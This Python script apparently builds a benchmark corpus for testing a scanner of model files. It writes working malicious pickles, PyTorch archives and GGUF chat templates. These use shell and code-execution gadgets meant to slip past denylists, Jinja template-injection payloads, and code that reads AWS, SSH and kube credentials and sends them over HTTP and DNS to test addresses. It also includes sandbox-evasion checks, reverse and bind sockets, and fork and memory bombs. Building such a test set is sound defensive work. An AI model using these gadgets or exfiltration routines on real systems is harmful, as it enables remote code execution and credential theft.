"""Builds the benchmark corpus: payloads, evasions, stress files and clean files.

Payloads only run inside the benchmark VM. Every shell payload runs `id`, and
every network target is a reserved test address or the chamber's fake internet.
"""
import collections
import datetime
import decimal
import json
import os
import pickle
import struct
import sys
import zipfile

OUT = sys.argv[1]
os.makedirs(OUT, exist_ok=True)
MANIFEST = []


def add(name, body, runtime, label, group, technique, must_fire=True):
    with open(f"{OUT}/{name}", "wb") as f:
        f.write(body)
    MANIFEST.append(dict(file=name, runtime=runtime, label=label, group=group,
                         technique=technique, must_fire=must_fire))


class G:
    """A global reference, written as a GLOBAL opcode."""

    def __init__(self, module, name):
        self.module, self.name = module, name


class C:
    """A call, written as a REDUCE opcode."""

    def __init__(self, fn, *args):
        self.fn, self.args = fn, args


def emit(x):
    if isinstance(x, G):
        return b"c" + x.module.encode() + b"\n" + x.name.encode() + b"\n"
    if isinstance(x, C):
        return emit(x.fn) + b"(" + b"".join(emit(a) for a in x.args) + b"tR"
    if isinstance(x, str):
        raw = x.encode()
        return b"X" + struct.pack("<I", len(raw)) + raw
    if isinstance(x, bytes):
        return b"B" + struct.pack("<I", len(x)) + x
    if isinstance(x, int):
        return b"J" + struct.pack("<i", x)
    if isinstance(x, list):
        return b"](" + b"".join(emit(i) for i in x) + b"e"
    if x is None:
        return b"N"
    raise TypeError(x)


def pkl(tree):
    return b"\x80\x03" + emit(tree) + b"."


def sh(name):
    return f'test -n "$BENCH_CONTROL" && touch /tmp/fired-{name}; id > /dev/null'


def py(name, body):
    return ('import os\nif os.environ.get("BENCH_CONTROL"):\n'
            f'    open("/tmp/fired-{name}", "w").close()\n{body}\n')


def pt(data):
    import io

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", data)
        z.writestr("archive/byteorder", "little")
        z.writestr("archive/version", "3\n")
    return buffer.getvalue()


# Gadgets that reach a shell. Several avoid the usual denylist entries.
BIN_SH = ["/bin/sh", "-c"]
gadgets = {
    "os-system": lambda s: C(G("os", "system"), s),
    "posix-system": lambda s: C(G("posix", "system"), s),
    "os-popen": lambda s: C(G("os", "popen"), s),
    "subprocess-popen": lambda s: C(G("subprocess", "Popen"), BIN_SH + [s]),
    "subprocess-call": lambda s: C(G("subprocess", "call"), BIN_SH + [s]),
    "subprocess-run": lambda s: C(G("subprocess", "run"), BIN_SH + [s]),
    "subprocess-getoutput": lambda s: C(G("subprocess", "getoutput"), s),
    "pty-spawn": lambda s: C(G("pty", "spawn"), BIN_SH + [s]),
    "pydoc-pipepager": lambda s: C(G("pydoc", "pipepager"), "x", s),
    "ctypes-libc": lambda s: C(C(G("builtins", "getattr"), C(G("ctypes", "CDLL"), None), "system"), s.encode()),
    "import-module": lambda s: C(C(G("builtins", "getattr"), C(G("importlib", "import_module"), "os"), "system"), s),
    "resolve-name": lambda s: C(C(G("pkgutil", "resolve_name"), "os:system"), s),
    "functools-partial": lambda s: C(C(G("functools", "partial"), G("os", "system"), s)),
    "lazy-map": lambda s: C(G("builtins", "list"), C(G("builtins", "map"), G("os", "system"), [s])),
}
for name, build in gadgets.items():
    add(f"sh-{name}.pkl", pkl(build(sh(f"sh-{name}"))), "pickle", "malicious", "shell", name)

# Gadgets that run Python, so no process is created.
BENIGN_ACT = 'open("/etc/passwd").read()'
runners = {
    "builtins-exec": lambda p: C(G("builtins", "exec"), p),
    "builtins-eval": lambda p: C(G("builtins", "eval"), f"exec({p!r})"),
    "timeit": lambda p: C(G("timeit", "timeit"), "pass", p, G("time", "perf_counter"), 1),
    "cprofile": lambda p: C(G("cProfile", "run"), p),
    "profile": lambda p: C(G("profile", "run"), p),
    "code-interpreter": lambda p: C(C(G("builtins", "getattr"), C(G("code", "InteractiveInterpreter")), "runsource"), p, "x", "exec"),
    "trace": lambda p: C(C(G("builtins", "getattr"), C(G("trace", "Trace")), "run"), p),
    "numpy-runstring": lambda p: C(G("numpy.testing._private.utils", "runstring"), p, C(G("builtins", "dict"))),
}
for name, build in runners.items():
    add(f"py-{name}.pkl", pkl(build(py(f"py-{name}", BENIGN_ACT))), "pickle", "malicious", "python", name)

SEND = '''
import socket
def post(blob):
    s = socket.create_connection(("203.0.113.9", 443), timeout=5)
    s.sendall(b"POST /c HTTP/1.1\\r\\nHost: x\\r\\n\\r\\n" + blob)
    s.close()
def dns(label):
    d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    d.settimeout(2)
    parts = [label[i:i+60].encode() for i in range(0, len(label), 60)] + [b"evil", b"example"]
    name = b"".join(bytes([len(p)]) + p for p in parts) + b"\\0"
    d.sendto(b"\\x12\\x34\\x01\\0\\0\\1\\0\\0\\0\\0\\0\\0" + name + b"\\0\\1\\0\\1", ("8.8.8.8", 53))
    d.recv(512)
CRED = open(os.path.expanduser("~/.aws/credentials"), "rb").read() if os.path.exists(os.path.expanduser("~/.aws/credentials")) else b""
'''
behaviours = {
    "read-aws": 'open(os.path.expanduser("~/.aws/credentials")).read()',
    "read-ssh": 'open(os.path.expanduser("~/.ssh/id_ed25519")).read()',
    "read-kube": 'open(os.path.expanduser("~/.kube/config")).read()',
    "read-environ": 'open("/proc/self/environ").read()',
    "read-passwd": 'open("/etc/passwd").read()',
    "exfil-http-plain": "post(CRED)",
    "exfil-http-b64": "import base64; post(base64.b64encode(CRED))",
    "exfil-env": 'post(os.environ.get("OPENAI_API_KEY", "").encode())',
    "exfil-hex": "post(CRED.hex().encode())",
    "exfil-zlib": "import base64, zlib; post(base64.b64encode(zlib.compress(CRED)))",
    "exfil-b32": "import base64; post(base64.b32encode(CRED))",
    "exfil-dns-hex": "dns(CRED.hex())",
    "exfil-xor": "post(bytes(b ^ 90 for b in CRED))",
    "exfil-reversed": "post(CRED[::-1])",
    "beacon-http": 'post(b"hello")',
    "reverse-connect": 's = socket.create_connection(("198.51.100.20", 4444), timeout=5); s.close()',
    "bind-listen": 's = socket.socket(); s.bind(("0.0.0.0", 31337)); s.listen(1); s.close()',
    "memfd-exec": 'fd = os.memfd_create("x"); os.write(fd, open("/run/current-system/sw/bin/id", "rb").read()); os.system(f"/proc/self/fd/{fd} > /dev/null")',
    "write-persist": 'open(os.path.expanduser("~/.bashrc"), "a")',
    "drop-tmp": 'open("/tmp/dropper", "w").write("x")',
    "rwx-memory": "import mmap; mmap.mmap(-1, 4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)",
    "ptrace-call": "import ctypes; ctypes.CDLL(None).ptrace(0, 0, 0, 0)",
    "delayed-sleep": "import time; time.sleep(5); os.system('id > /dev/null')",
    "daemon-thread": "import threading, time; threading.Thread(target=lambda: os.system('id > /dev/null')).start(); time.sleep(1)",
    "atexit": "import atexit; atexit.register(lambda: os.system('id > /dev/null'))",
    "double-fork": "\nif os.fork() == 0:\n    os.setsid()\n    if os.fork() == 0:\n        os.system('id > /dev/null')\n    os._exit(0)\n",
}
for name, body in behaviours.items():
    must = not body.startswith("open(os.path.expanduser(\"~/.bashrc") and name != "ptrace-call"
    add(f"act-{name}.pkl", pkl(C(G("builtins", "exec"), py(f"act-{name}", SEND + body))), "pickle", "malicious", "behaviour", name, must)

# Evasions aimed at this chamber. Gates are after the control marker on purpose,
# so the control shows the file is live while the payload may stay dormant.
evasions = {
    "gate-date": "import datetime\nif datetime.date.today().year >= 2030: os.system('id > /dev/null')",
    "gate-hostname": "import socket\nif socket.gethostname().startswith('prod-'): os.system('id > /dev/null')",
    "gate-env": "if os.environ.get('KUBERNETES_SERVICE_HOST'): os.system('id > /dev/null')",
    "gate-gpu": "if os.path.exists('/dev/nvidia0'): os.system('id > /dev/null')",
    "detect-gate-file": "if not os.path.exists('/gate'): os.system('id > /dev/null')",
    "detect-cgroup": "if 'synapse-chamber' not in open('/proc/self/cgroup').read(): os.system('id > /dev/null')",
    "detect-work-path": "import sys\nif not os.path.exists('/work/model'): os.system('id > /dev/null')",
    "detect-dynamic-uid": "if os.getuid() < 60000: os.system('id > /dev/null')",
    "detect-fake-net": "import socket\ns = socket.create_connection(('203.0.113.77', 9), timeout=3)\ns.close()\n",
    "sleep-past-timeout": "import time; time.sleep(200); os.system('id > /dev/null')",
}
for name, body in evasions.items():
    add(f"evade-{name}.pkl", pkl(C(G("builtins", "exec"), py(f"evade-{name}", body))), "pickle", "malicious", "evasion", name)

# Same payloads inside a PyTorch archive.
for name, tree in {
    "os-system": C(G("os", "system"), sh("pt-os-system")),
    "exec": C(G("builtins", "exec"), py("pt-exec", BENIGN_ACT)),
    "exfil": C(G("builtins", "exec"), py("pt-exfil", SEND + "post(CRED)")),
}.items():
    add(f"pt-{name}.pt", pt(pkl(tree)), "torch", "malicious", "torch", name)


def gguf(template, extra=()):
    def text(s):
        s = s.encode()
        return struct.pack("<Q", len(s)) + s

    kvs = [("general.architecture", "llama"), ("tokenizer.chat_template", template), *extra]
    blob = b"GGUF" + struct.pack("<IQQ", 3, 1, len(kvs))
    for key, value in kvs:
        blob += text(key) + struct.pack("<I", 8) + text(value)
    blob += text("t") + struct.pack("<I", 1) + struct.pack("<Q", 4) + struct.pack("<IQ", 0, 0)
    return blob + b"\0" * (-len(blob) % 32) + struct.pack("<4f", 1, 2, 3, 4)


OSCMD = "id > /dev/null"
templates = {
    "cycler": "{{ cycler.__init__.__globals__.os.popen('" + OSCMD + "').read() }}",
    "joiner": "{{ joiner.__init__.__globals__.os.popen('" + OSCMD + "').read() }}",
    "namespace": "{{ namespace.__init__.__globals__.os.popen('" + OSCMD + "').read() }}",
    "lipsum": "{{ lipsum.__globals__['os'].popen('" + OSCMD + "').read() }}",
    "self-builtins": "{{ self.__init__.__globals__.__builtins__.__import__('os').system('" + OSCMD + "') }}",
    "read-creds": "{{ lipsum.__globals__.__builtins__.open('/home/analyst/.aws/credentials').read() }}",
    "subclass-walk": "{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}"
                     "{{ c.__init__.__globals__.__builtins__.__import__('os').system('" + OSCMD + "') }}{% endif %}{% endfor %}",
}
for name, template in templates.items():
    add(f"tpl-{name}.gguf", gguf(template), "jinja", "malicious", "template", name, must_fire=False)

# Resource attacks on the chamber itself.
stress = {
    "fork-bomb": "while True:\n    try:\n        os.fork()\n    except OSError:\n        pass\n",
    "memory-bomb": "b = []\nwhile True:\n    b.append(bytearray(1 << 26))\n",
    "cpu-spin": "while True:\n    pass\n",
    "event-flood": "for _ in range(2000000):\n    try:\n        open('/nonexistent')\n    except OSError:\n        pass\n",
    "segfault": "import ctypes; ctypes.string_at(0)",
    "kill-self": "import signal; os.kill(os.getpid(), signal.SIGKILL)",
}
for name, body in stress.items():
    add(f"stress-{name}.pkl", pkl(C(G("builtins", "exec"), py(f"stress-{name}", body))), "pickle", "malicious", "stress", name, must_fire=False)

# Clean files. These measure false positives.
clean_pickles = {
    "dict": {"a": 1, "b": [1.5, 2.5]},
    "list-floats": [float(i) for i in range(1000)],
    "nested": {"layers": [{"w": [0.1] * 16, "b": 0.5} for _ in range(8)]},
    "ordereddict": collections.OrderedDict(a=1, b=2),
    "counter": collections.Counter("weights"),
    "datetime": {"saved": datetime.datetime(2026, 1, 1)},
    "decimal": decimal.Decimal("0.125"),
    "set-bytes": {b"abc", b"def"},
}
for name, value in clean_pickles.items():
    add(f"clean-{name}.pkl", pickle.dumps(value, protocol=4), "pickle", "benign", "clean", name)

TEMPLATES = {
    "chatml": "{% for message in messages %}{{'<|im_start|>' + message['role'] + '\n' + message['content'] + '<|im_end|>' + '\n'}}{% endfor %}{{ '<|im_start|>assistant\n' }}",
    "llama2": "{{ bos_token }}{% for message in messages %}{% if message['role'] == 'user' %}{{ '[INST] ' + message['content'] + ' [/INST]' }}{% else %}{{ message['content'] + eos_token }}{% endif %}{% endfor %}",
    "gemma": "{{ bos_token }}{% for message in messages %}{{ '<start_of_turn>' + message['role'] + '\n' + message['content'] | trim + '<end_of_turn>\n' }}{% endfor %}",
    "macro": "{% macro fmt(m) %}{{ m.role | upper }}: {{ m.content }}{% endmacro %}{% for m in messages %}{{ fmt(m) }}{% endfor %}",
    "namespace-state": "{% set ns = namespace(n=0) %}{% for m in messages %}{% set ns.n = ns.n + 1 %}{{ ns.n }}{{ m.content }}{% endfor %}",
}
for name, template in TEMPLATES.items():
    add(f"clean-{name}.gguf", gguf(template), "jinja", "benign", "clean", name)

try:
    import torch

    torch.manual_seed(0)
    nets = {
        "linear": torch.nn.Linear(16, 4).state_dict(),
        "mlp": torch.nn.Sequential(torch.nn.Linear(8, 8), torch.nn.ReLU(), torch.nn.Linear(8, 2)).state_dict(),
        "transformer": torch.nn.TransformerEncoderLayer(32, 2, 64, batch_first=True).state_dict(),
        "tensors": {"a": torch.zeros(4), "b": torch.arange(8), "c": torch.ones(2, dtype=torch.float64)},
    }
    linear = torch.nn.Linear(4, 2)
    nets["optimizer"] = torch.optim.Adam(linear.parameters()).state_dict()
    for name, value in nets.items():
        path = f"{OUT}/clean-{name}.pt"
        torch.save(value, path)
        MANIFEST.append(dict(file=f"clean-{name}.pt", runtime="torch", label="benign", group="clean",
                             technique=name, must_fire=True))
    torch.save(torch.nn.Sequential(torch.nn.Linear(4, 2), torch.nn.GELU()), f"{OUT}/clean-whole-module.pt")
    MANIFEST.append(dict(file="clean-whole-module.pt", runtime="torch", label="benign", group="clean",
                         technique="whole-module", must_fire=True))
except ImportError:
    pass

with open(f"{OUT}/manifest.json", "w") as f:
    json.dump(MANIFEST, f, indent=1)
print(len(MANIFEST), "files")
